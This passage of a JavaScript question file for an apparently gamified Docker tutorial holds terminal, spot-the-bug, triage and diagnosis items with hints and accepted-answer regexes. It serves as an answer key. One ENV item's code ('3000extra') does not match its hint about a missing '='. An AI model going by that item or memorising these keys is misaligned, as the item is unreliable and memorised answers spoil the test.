          hintNudge: 'The same -v flag can mount a real host PATH instead of a named volume — $(pwd) gives the current directory\'s absolute path.',
          hintPartial: 'docker run -v $(pwd):____ myapp',
          hintFull: 'docker run -v $(pwd):/app myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+-v\s+\$\(pwd\):\/app\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken churns a current: <strong>"Create a custom user-defined network called <code>appnet</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 45,
          hintNudge: 'The network family\'s create subcommand.',
          hintPartial: 'docker network ______ appnet',
          hintFull: 'docker network create appnet',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+network\s+create\s+appnet$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink swirls into a ring: <strong>"List every Docker network that exists on this host."</strong>',
          damageIfCorrect: 12, damageIfOptimal: 18, timeAllotted: 45,
          hintNudge: 'The network family\'s list subcommand.',
          hintPartial: 'docker network __',
          hintFull: 'docker network ls',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+network\s+ls$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s eye gleams: <strong>"Run <code>myapp</code> attached to the <code>appnet</code> network."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'A flag on docker run attaches the new container to a specific existing network.',
          hintPartial: 'docker run --_______ appnet myapp',
          hintFull: 'docker run --network appnet myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--network\s+appnet\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle taps twice: <strong>"Run <code>myapp</code>, setting the environment variable <code>NODE_ENV</code> to <code>production</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 45,
          hintNudge: 'The environment-variable flag on docker run, in KEY=VALUE form.',
          hintPartial: 'docker run -e NODE_ENV=________ myapp',
          hintFull: 'docker run -e NODE_ENV=production myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+-e\s+NODE_ENV=production\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken drifts near a scroll: <strong>"Run <code>myapp</code>, loading a whole batch of environment variables from a file called <code>.env</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'A dedicated flag loads an entire file of KEY=VALUE lines at once, instead of one -e per variable.',
          hintPartial: 'docker run --________ .env myapp',
          hintFull: 'docker run --env-file .env myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--env-file\s+\.env\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink darkens the current: <strong>"Bring up every service defined in <code>docker-compose.yml</code>, in the background."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'compose\'s "up" command with the same detached flag as a plain docker run.',
          hintPartial: 'docker-compose up -_',
          hintFull: 'docker-compose up -d',
          acceptablePatterns: [/^docker-compose\s+up$/i, /^docker\s+compose\s+up\s+-d$/i],
          optimalPatterns: [/^docker-compose\s+up\s+-d$/i],
          baseCmds: ['docker-compose', 'docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken retreats slightly: <strong>"Stop and remove every container AND network that <code>docker-compose.yml</code> created."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'One compose subcommand tears down everything "up" created, in one step.',
          hintPartial: 'docker-compose ____',
          hintFull: 'docker-compose down',
          acceptablePatterns: [/^docker\s+compose\s+down$/i],
          optimalPatterns: [/^docker-compose\s+down$/i],
          baseCmds: ['docker-compose', 'docker']
        },
        {
          mode: 'terminal',
          prompt: 'A rumble rises from the depths: <strong>"Remove every stopped container, unused network, and dangling image, without being asked to confirm."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'A single system-level cleanup subcommand, with a force flag to skip the confirmation prompt.',
          hintPartial: 'docker system _____ -_',
          hintFull: 'docker system prune -f',
          acceptablePatterns: [/^docker\s+system\s+prune$/i],
          optimalPatterns: [/^docker\s+system\s+prune\s+-f$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken shows a warped scroll: <strong>"This container never responds to <code>docker stop</code> gracefully — it always gets force-killed after a timeout. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'CMD written in "shell form" (a bare string) runs through /bin/sh -c, so YOUR process isn\'t actually PID 1 — signals sent to the container never reach it directly.',
          hintPartial: 'Line 2 uses shell-form CMD ("npm start"), which wraps the real process in a shell — switch to exec form (a JSON array) so it receives signals directly.',
          hintFull: 'Line 2 should read: CMD ["npm", "start"]',
          codeBlock: [
            'FROM node:18',
            'CMD npm start'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^CMD\s*\[\s*"npm"\s*,\s*"start"\s*\]$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A scroll unravels: <strong>"This Dockerfile\'s environment variable never actually gets its intended value. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'ENV syntax needs an equals sign between the key and value (or a space, in the older two-token form) — check exactly how this line is written.',
          hintPartial: 'Line 2 is missing the "=" between PORT and 3000 — as written, Docker doesn\'t parse this the way it looks like it should.',
          hintFull: 'Line 2 should read: ENV PORT=3000',
          codeBlock: [
            'FROM node:18',
            'ENV PORT 3000extra'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^ENV\s+PORT=3000$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken\'s eye flares: <strong>"This multi-stage build fails on the second stage, unable to find anything from the first. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'To copy files from an earlier build stage, the COPY instruction needs a --from flag naming that stage — plain COPY only looks at the local build context.',
          hintPartial: 'Line 4\'s COPY needs --from=builder to actually pull files from the first stage, instead of looking in the build context.',
          hintFull: 'Line 4 should read: COPY --from=builder /app/dist ./dist',
          codeBlock: [
            'FROM node:18 AS builder',
            'RUN npm run build',
            'FROM nginx',
            'COPY /app/dist ./dist'
          ],
          buggyLineId: 3,
          correctFixPatterns: [/^COPY\s+--from=builder\s+\/app\/dist\s+\.\/dist$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A stone panel grinds within the scroll: <strong>"This compose file\'s port mapping is backwards — the app is reachable on the wrong port. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'Compose port mappings are written "host:container" — check which side is actually first.',
          hintPartial: 'Line 3 has "80:8080", meaning host port 80 maps to the container\'s port 8080 — but the app inside actually listens on 80, so the mapping is flipped.',
          hintFull: 'Line 3 should read: - "8080:80"',
          codeBlock: [
            'services:',
            '  web:',
            '    ports: ["80:8080"]'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/ports:\s*\[\s*"8080:80"\s*\]/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'Ink curls around a warning: <strong>"Every build of this image takes forever and the resulting image is huge, because <code>node_modules</code> keeps getting copied in from the host. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28, timeAllotted: 45,
          hintNudge: 'A .dockerignore file (missing here) excludes files from the build context, the same way .gitignore excludes files from git — without one, EVERYTHING in the folder gets sent to the build, node_modules included.',
          hintPartial: 'Add a .dockerignore file listing node_modules, so it\'s excluded from the build context sent to the Docker daemon.',
          hintFull: 'Create a .dockerignore file containing: node_modules',
          codeBlock: [
            '(no .dockerignore file exists in this project)'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/node_modules/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken tilts curiously: <strong>"A database container needs its data to survive being removed and recreated. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30, timeAllotted: 45,
          hintNudge: 'One option keeps data only as long as the specific container exists. One option keeps data managed by Docker, independent of any one container\'s lifecycle.',
          hintPartial: 'A named volume is managed by Docker itself and survives a container being removed and a new one created in its place.',
          hintFull: 'Best: use a named volume — it persists independently of any single container\'s lifecycle, which is exactly what "survive being removed and recreated" requires.',
          options: [
            { id: 'a', label: 'Don\'t mount anything — just let the data live inside the container\'s own filesystem', tier: 'wrong', why: 'Data written to a container\'s own writable layer is destroyed the moment that specific container is removed — this is the opposite of what "survive removal" needs.' },
            { id: 'b', label: 'Use a named volume, mounted into the container', tier: 'best', why: 'Named volumes are managed by Docker independently of any one container — remove and recreate the container, and the volume (and its data) is still there to reattach.' },
            { id: 'c', label: 'Bind-mount a host directory instead', tier: 'defensible', why: 'Would also survive container removal, but ties the setup to a specific host path/permissions model — a named volume is the more portable, Docker-native choice for this exact need.' }
          ],
          justificationPatterns: [/named\s*volume|persist|survive|managed\s*by\s*docker|independent/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle curls in thought: <strong>"You need to run a 3-container app (web, api, database) together, reliably, every time. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30, timeAllotted: 45,
          hintNudge: 'One approach requires remembering and re-typing multiple long docker run commands, in the right order, every single time. One approach declares the whole setup once, in a file.',
          hintPartial: 'A docker-compose.yml declares all 3 services, their networking, and their startup order in one file — one command brings the whole stack up consistently.',
          hintFull: 'Best: use docker-compose (or Compose v2\'s docker compose) — declaring the 3 services in one YAML file makes the setup reproducible and version-controllable, instead of relying on remembering multiple manual docker run invocations.',
          options: [
            { id: 'a', label: 'Run 3 separate docker run commands by hand each time', tier: 'wrong', why: 'Error-prone and easy to get wrong (forgetting a flag, wrong network, wrong order) — and there\'s no single source of truth for "how this app actually runs."' },
            { id: 'b', label: 'Define all 3 services in one docker-compose.yml', tier: 'best', why: 'One declarative file captures the whole setup — networking between the 3 containers, environment, volumes — and "docker-compose up" reproduces it identically every time.' },
            { id: 'c', label: 'Write a custom shell script that runs the 3 docker commands in sequence', tier: 'defensible', why: 'Better than typing commands manually, but reinvents what Compose already does natively (service dependencies, shared networking) with less tooling support around it.' }
          ],
          justificationPatterns: [/compose|one\s*file|declarative|reproducible|source\s*of\s*truth/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s voice bubbles: <strong>"Should a Node.js app\'s <code>node_modules</code> be copied from your local machine into the image, or installed fresh inside the build? Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30, timeAllotted: 45,
          hintNudge: 'Your local machine\'s OS/architecture may not match the image\'s — native dependencies built locally can silently be incompatible inside the container.',
          hintPartial: 'Installing fresh inside the build guarantees dependencies are built for the CONTAINER\'s actual environment, not whatever OS/arch your laptop happens to be.',
          hintFull: 'Best: run npm install (or equivalent) INSIDE the build (COPY package.json first, RUN npm install, then COPY the rest) — copying a locally-built node_modules risks native-module/OS mismatches and also skips useful layer caching on the dependency step.',
          options: [
            { id: 'a', label: 'COPY the local node_modules folder straight into the image', tier: 'wrong', why: 'Native dependencies compiled on your laptop (a different OS/architecture than the container) can be silently broken inside the image — a classic "works on my machine" trap.' },
            { id: 'b', label: 'COPY only package.json first, RUN npm install inside the build, then COPY the rest of the source', tier: 'best', why: 'Installs dependencies in the actual target environment (correct for the container, not your laptop) AND gets dependency-layer caching, since that layer only rebuilds when package.json actually changes.' },
            { id: 'c', label: 'Install dependencies once outside Docker and mount them in at runtime', tier: 'defensible', why: 'Avoids the install step at build time, but reintroduces the exact same host/container mismatch risk, and the image is no longer self-contained/portable.' }
          ],
          justificationPatterns: [/install\s*inside|build\s*environment|native|mismatch|caching|package\.json\s*first/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken\'s ink spreads. <strong>"docker run" fails immediately with a port-related error. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'Read the exact wording — this is about the HOST port already being claimed by something else, not a problem with the image itself.',
          hintPartial: '"port is already allocated" means another container (or process) on the host is already bound to that exact host port.',
          hintFull: 'Diagnosis: another container (or host process) is already using that host port. Fix: choose a different host port to publish on, or stop whatever\'s already using it.',
          outputBlock: [
            '$ docker run -d -p 8080:80 nginx',
            'docker: Error response from daemon: driver failed programming external connectivity: Bind for 0.0.0.0:8080 failed: port is already allocated'
          ],
          acceptableDiagnosesPatterns: [/port.*(already\s*(in\s*use|allocated|taken))/i, /another\s*(container|process).*port/i],
          followUpFix: {
            prompt: 'Find out what\'s currently using host port 8080:',
            acceptablePatterns: [/^(sudo\s+)?lsof\s+-i\s*:8080$/i, /^(sudo\s+)?ss\s+-tlnp\s*\|\s*grep\s+8080$/i],
            optimalPatterns: [/^docker\s+ps\s*\|\s*grep\s+8080$/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'Ink darkens the water. <strong>You remove a container and recreate it, and all the app\'s data is gone. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'Check whether the original container was actually mounting any volume at all — data written only to a container\'s own writable layer disappears with that container.',
          hintPartial: 'The original docker run had no -v flag at all — the data lived only inside the removed container\'s own filesystem, which is gone forever along with it.',
          hintFull: 'Diagnosis: the container had no persistent volume mounted, so its data lived only in its own (now-deleted) writable layer. Fix: recreate it with a named volume mounted at the app\'s data path, going forward.',
          outputBlock: [
            '$ docker run -d --name db postgres',
            '(used for weeks, then...)',
            '$ docker rm -f db && docker run -d --name db postgres',
            '(all previous data is gone)'
          ],
          acceptableDiagnosesPatterns: [/no\s*volume/i, /never\s*mounted/i, /writable\s*layer/i, /(only\s*)?(lived|stored)\s*inside\s*the\s*container/i],
          followUpFix: {
            prompt: 'Recreate it correctly this time, with a named volume for persistence:',
            acceptablePatterns: [],
            optimalPatterns: [/docker\s+run\s+.*-v\s+\w+:\/var\/lib\/postgresql\/data/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Kraken groans from below. <strong>One container can\'t reach another container by its name, even though both are running. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 45,
          hintNudge: 'Docker\'s built-in name-based DNS only works between containers on the same USER-DEFINED network — the default bridge network doesn\'t support it.',
          hintPartial: 'Both containers are on the default bridge network (no --network flag used), which doesn\'t support resolving other containers by name — only a user-defined network does.',
          hintFull: 'Diagnosis: both containers are on the default bridge network, which lacks automatic name-based DNS between containers. Fix: create a user-defined network and run both containers attached to it.',
          outputBlock: [
            '$ docker exec web ping api',
            'ping: api: Name or service not known',
            '',
            '$ docker network inspect bridge | grep -A2 web',
            '(both "web" and "api" are on the default "bridge" network)'
          ],
          acceptableDiagnosesPatterns: [/default\s*bridge/i, /no\s*(name.?based\s*)?dns/i, /not\s*on\s*(a\s*)?(user.?defined|custom)\s*network/i],
          followUpFix: {
            prompt: 'Fix it by creating a custom network and attaching both containers to it:',
            acceptablePatterns: [],
            optimalPatterns: [/^docker\s+network\s+create\s+\w+$/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Kraken churns a whirlpool. <strong>Sequence the correct order for standing up a multi-container app with Compose.</strong>',
          steps: [
            'Write docker-compose.yml defining all services',
            'docker-compose build',
            'docker-compose up -d',
            'docker-compose ps to confirm every service is running'
          ],
          damageIfCorrect: 22, damageIfOptimal: 36,
          damageToHeroIfWrong: 20
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'Ink billows in a slow ring. <strong>Sequence the correct order for properly persisting a database container\'s data.</strong>',
          steps: [
            'Create a named volume',
            'Run the database container, mounting that volume at its data directory',
            'Write some data and confirm it\'s there',
            'Remove and recreate the container, reusing the same volume, and confirm the data survived'
          ],
          damageIfCorrect: 22, damageIfOptimal: 36,
          damageToHeroIfWrong: 20
        }
      ]
    },
    {
      name: 'Level 3 — Advanced Basics',
      hp: 135,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Kraken presses down harder: <strong>"Run <code>myapp</code> capped at 512MB of memory and 1 CPU."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'Two resource-limiting flags on docker run — one for memory, one for CPU count.',
          hintPartial: 'docker run --memory=____ --cpus=_ myapp',
          hintFull: 'docker run --memory=512m --cpus=1 myapp',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+run\s+--memory=512m\s+--cpus=1\s+myapp$/i, /^docker\s+run\s+--cpus=1\s+--memory=512m\s+myapp$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle presses the glass: <strong>"Show live, continuously updating CPU/memory usage for every running container."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 40,
          hintNudge: 'Docker\'s own equivalent of "top", scoped to containers instead of host processes.',
          hintPartial: 'docker st___',
          hintFull: 'docker stats',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+stats$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken holds still: <strong>"Show ONE snapshot of container resource usage right now, without it continuously refreshing."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 40,
          hintNudge: 'docker stats has a flag specifically to disable its live-refreshing "stream" behavior.',
          hintPartial: 'docker stats --__-______',
          hintFull: 'docker stats --no-stream',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+stats\s+--no-stream$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink flows toward the surface: <strong>"Authenticate to the private registry <code>registry.example.com</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 40,
          hintNudge: 'One subcommand handles registry authentication, taking the registry hostname as an argument.',
          hintPartial: 'docker log__ registry.example.com',
          hintFull: 'docker login registry.example.com',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+login\s+registry\.example\.com$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken condenses ink into a shape: <strong>"Export the image <code>myapp:1.0</code> to a tar file called <code>myapp.tar</code>, for moving to an offline machine."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'One subcommand exports a whole image (not a container\'s filesystem) to a tar archive, using an output flag.',
          hintPartial: 'docker s___ -o myapp.tar myapp:1.0',
          hintFull: 'docker save -o myapp.tar myapp:1.0',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+save\s+-o\s+myapp\.tar\s+myapp:1\.0$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'A tentacle reshapes the ink: <strong>"Import the image from <code>myapp.tar</code> back into Docker."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'The counterpart to docker save, taking an input flag.',
          hintPartial: 'docker l___ -i myapp.tar',
          hintFull: 'docker load -i myapp.tar',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+load\s+-i\s+myapp\.tar$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken circles a ring of ink: <strong>"Show detailed configuration for the network <code>appnet</code>, including which containers are attached to it."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22, timeAllotted: 40,
          hintNudge: 'The same "inspect" pattern used for containers and images also works on networks.',
          hintPartial: 'docker network in_____ appnet',
          hintFull: 'docker network inspect appnet',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+network\s+inspect\s+appnet$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'Ink darkens around a name: <strong>"Get a shell inside the running container <code>web</code>, but as the user <code>appuser</code> instead of root."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'docker exec has a user flag, same idea as chmod/chown\'s user targeting — one letter, then the username.',
          hintPartial: 'docker exec -_ appuser -it web bash',
          hintFull: 'docker exec -u appuser -it web bash',
          acceptablePatterns: [/^docker\s+exec\s+-it\s+-u\s+appuser\s+web\s+bash$/i],
          optimalPatterns: [/^docker\s+exec\s+-u\s+appuser\s+-it\s+web\s+bash$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'terminal',
          prompt: 'The Kraken\'s form ripples: <strong>"Show every layer that makes up the image <code>myapp:1.0</code>, and how large each one is."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 40,
          hintNudge: 'One subcommand shows an image\'s full build history, layer by layer, with each layer\'s size.',
          hintPartial: 'docker hi____ myapp:1.0',
          hintFull: 'docker history myapp:1.0',
          acceptablePatterns: [],
          optimalPatterns: [/^docker\s+history\s+myapp:1\.0$/i],
          baseCmds: ['docker']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken shows a warped scroll: <strong>"This Dockerfile builds correctly, but ANY code change forces a full, slow re-install of all dependencies. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'Docker caches each layer and only re-runs a layer (and everything after it) if its own inputs changed — copying ALL source code before installing dependencies means every code change invalidates the install step too.',
          hintPartial: 'Line 2 copies everything (including code that changes constantly) BEFORE the dependency install — reorder so package.json is copied and installed first, on its own.',
          hintFull: 'Line 2 should read: COPY package.json . (with a separate RUN npm install right after it, THEN a later COPY . . for the rest of the source)',
          codeBlock: [
            'FROM node:18',
            'COPY . .',
            'RUN npm install'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^COPY\s+package\.json\s+\.$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A scroll unravels: <strong>"This container runs its app as root, with no reason to. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'Without an explicit USER instruction, Docker defaults to running everything as root — a dedicated instruction switches to a non-root user before the app starts.',
          hintPartial: 'Add a USER instruction (after creating a non-root user) before the CMD, so the app doesn\'t run with unnecessary root privileges.',
          hintFull: 'Add this line before CMD: USER node (Node\'s official images already ship a built-in, non-root "node" user)',
          codeBlock: [
            'FROM node:18',
            'WORKDIR /app',
            'COPY . .',
            'CMD ["node", "index.js"]'
          ],
          buggyLineId: 3,
          correctFixPatterns: [/^USER\s+node$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Kraken\'s eye flares: <strong>"This container\'s HEALTHCHECK never actually runs — Docker just ignores it. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'HEALTHCHECK needs an explicit CMD keyword before the actual command it runs — without it, the instruction is malformed.',
          hintPartial: 'Line 2 is missing the CMD keyword that HEALTHCHECK requires before the actual check command.',
          hintFull: 'Line 2 should read: HEALTHCHECK CMD curl -f http://localhost/ || exit 1',
          codeBlock: [
            'FROM nginx',
            'HEALTHCHECK curl -f http://localhost/ || exit 1'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^HEALTHCHECK\s+CMD\s+curl\s+-f\s+http:\/\/localhost\/\s*\|\|\s*exit\s+1$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A stone panel grinds within the scroll: <strong>"This multi-stage build\'s ARG value is empty in the second stage, even though it was set before FROM. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'An ARG declared before the first FROM is only visible to FROM instructions themselves — each build stage needs its OWN ARG re-declaration to use that value inside it.',
          hintPartial: 'Line 4 (inside the second stage) needs its own ARG APP_VERSION line before it can reference $APP_VERSION there.',
          hintFull: 'Add this line at the start of the second stage: ARG APP_VERSION',
          codeBlock: [
            'ARG APP_VERSION=1.0',
            'FROM node:18 AS builder',
            'FROM nginx',
            'RUN echo "Version: $APP_VERSION"'
          ],
          buggyLineId: 2,
          correctFixPatterns: [/^ARG\s+APP_VERSION$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'Ink curls around a warning: <strong>"This image ships the entire compiler toolchain in production, making it enormous, when only the compiled binary is actually needed. Find and fix the bug."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 32, timeAllotted: 40,
          hintNudge: 'A single-stage build ships EVERYTHING used anywhere in the Dockerfile, build tools included — splitting into a build stage and a separate final stage lets you leave the toolchain behind.',
          hintPartial: 'Restructure into a multi-stage build: compile in a "builder" stage, then COPY only the final compiled binary into a clean final-stage image.',
          hintFull: 'Line 1 should become two stages: FROM golang:1.21 AS builder (compiles the binary) ... FROM alpine (final stage that only COPY --from=builder\'s the compiled binary)',
          codeBlock: [
            'FROM golang:1.21',
            'COPY . .',
            'RUN go build -o app .',
            'CMD ["./app"]'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/multi.?stage|AS\s+builder|FROM\s+\w+\s+AS/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken tilts curiously: <strong>"Choosing a base image for a small, simple app with no unusual native dependencies. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 40,
          hintNudge: 'One base image family is built around minimizing size. One is built around maximum compatibility, at the cost of size.',
          hintPartial: 'For a simple app with no unusual native-dependency needs, the smaller base image gives real size/attack-surface benefits with no real downside.',
          hintFull: 'Best: an alpine-based image — dramatically smaller, faster to pull/deploy, smaller attack surface — full debian/ubuntu bases are reserved for cases with real native-dependency compatibility needs alpine can\'t satisfy.',
          options: [
            { id: 'a', label: 'A full Ubuntu or Debian base image, to be safe', tier: 'defensible', why: 'Maximizes compatibility, but for a simple app with no unusual native dependencies, this is real unnecessary size and attack surface with no actual benefit being used.' },
            { id: 'b', label: 'An Alpine-based image', tier: 'best', why: 'Dramatically smaller than a full distro base, with no real downside for an app that doesn\'t have unusual native-dependency compilation needs — the standard default choice for simple apps.' },
            { id: 'c', label: 'The largest, most fully-featured image available, to avoid ever hitting a missing-tool error', tier: 'wrong', why: 'Optimizes for a problem ("missing a tool") that rarely actually occurs, at the cost of real, guaranteed size and security downsides on every single image built.' }
          ],
          justificationPatterns: [/alpine|smaller|size|attack\s*surface|minimal/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A tentacle curls in thought: <strong>"A container\'s process currently runs as root with no specific need to. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 40,
          hintNudge: 'If the app is ever compromised, what it can do inside (and potentially outside) the container depends heavily on what user it\'s running as.',
          hintPartial: 'Running as a non-root user limits the blast radius if the app is ever compromised — a security best practice with essentially no downside for a normal app.',
          hintFull: 'Best: add a USER instruction switching to a dedicated non-root user before the app starts — running as root inside a container with no actual need is an unnecessary, well-known security risk.',
          options: [
            { id: 'a', label: 'Leave it running as root, since Docker isolation handles the risk', tier: 'wrong', why: 'Container isolation reduces but does NOT eliminate the risk of running as root — a container escape or misconfiguration is far more dangerous if the compromised process was root.' },
            { id: 'b', label: 'Add a USER instruction to run as a dedicated non-root user', tier: 'best', why: 'Standard security best practice with essentially no downside for a normal app — limits what a compromised process could do, inside or outside the container.' },
            { id: 'c', label: 'Run it in a separate, more locked-down VM instead of addressing the container itself', tier: 'defensible', why: 'Adds real infrastructure complexity to work around a problem that a one-line USER instruction directly and simply solves.' }
          ],
          justificationPatterns: [/non.?root|USER\s*instruction|least\s*privilege|blast\s*radius|security/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken\'s voice bubbles: <strong>"A Dockerfile needs a value only during the build (e.g. a build-time version tag) that the running app never needs to read. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 40,
          hintNudge: 'One instruction\'s value is baked permanently into the running container\'s environment. One instruction\'s value only exists during the build itself and leaves no trace in the final image\'s runtime environment.',
          hintPartial: 'ARG is specifically for build-time-only values — it doesn\'t persist into the running container\'s environment the way ENV does.',
          hintFull: 'Best: use ARG for a build-time-only value — ENV would unnecessarily bake it into the final image\'s runtime environment forever, when the app never actually needs to read it.',
          options: [
            { id: 'a', label: 'Use ENV, so it\'s definitely available everywhere', tier: 'wrong', why: 'Permanently bakes a value the running app never needs into the final image\'s environment forever — unnecessary bloat and a potential minor information leak for no benefit.' },
            { id: 'b', label: 'Use ARG', tier: 'best', why: 'Exactly matches the need — available during the build, gone from the final running container\'s environment, since the app never actually needs to read it at runtime.' },
            { id: 'c', label: 'Hardcode the value directly into the Dockerfile\'s RUN commands', tier: 'defensible', why: 'Works for a truly one-off value, but loses the flexibility of passing it in at build time (e.g. via --build-arg) without editing the Dockerfile itself.' }
          ],
          justificationPatterns: [/ARG|build.?time\s*only|not\s*(needed|used)\s*at\s*runtime/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Kraken churns thoughtfully: <strong>"Deciding whether a Dockerfile needs to be restructured as a multi-stage build. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34, timeAllotted: 40,
          hintNudge: 'The deciding question is whether anything used ONLY during the build (compilers, build-time dependencies) is currently also shipping in the final runtime image.',
          hintPartial: 'If build-only tools (compilers, dev dependencies) are present in the SAME final image that runs in production, that\'s exactly the situation multi-stage builds solve.',
          hintFull: 'Best: restructure to multi-stage whenever build-only tooling would otherwise ship in the final image — a build stage does the compiling, a clean final stage only copies the finished artifact, keeping build tools out of production entirely.',
          options: [
